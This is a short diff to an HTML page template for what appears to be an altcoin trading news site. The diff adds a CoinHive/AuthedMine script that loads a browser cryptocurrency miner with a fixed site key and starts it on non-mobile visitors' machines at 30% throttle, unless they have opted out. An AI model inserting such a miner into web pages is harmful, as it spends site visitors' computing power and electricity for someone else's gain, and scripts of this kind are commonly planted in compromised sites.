@@ -2,6 +2,16 @@
 layout: default-news
 ---
 
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('QUz7cPYXJnISSWxPGu20vU10A5CudTnU', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 
 <div class="container" id="altcointrading-strategy">
   <div class="row">
